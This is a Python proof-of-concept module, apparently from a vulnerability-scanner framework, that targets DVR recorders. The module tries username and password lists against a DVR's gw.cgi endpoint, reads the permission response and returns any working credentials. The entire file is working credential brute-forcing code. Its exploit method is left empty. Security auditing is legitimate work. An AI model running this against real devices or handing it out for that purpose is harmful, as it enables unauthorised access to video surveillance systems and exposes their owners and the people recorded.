import requests

from loguru import logger

from .base import POCTemplate


class DvrWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dvr']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.low
        self.desc = ''

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        for user in self.config.users:
            for password in self.config.passwords:
                url = f'http://{ip}:{port}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{password}"><config base=""/><playback base=""/></rpermission></juan>'
                try:
                    r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout)
                    if r.status_code == 200 and '<rpermission' in r.text:
                        items = r.text.split()
                        idx = items.index('<rpermission')
                        if '0' in items[idx + 1]:
                            return ip, str(port), self.product, user, password, self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(DvrWeakPassword)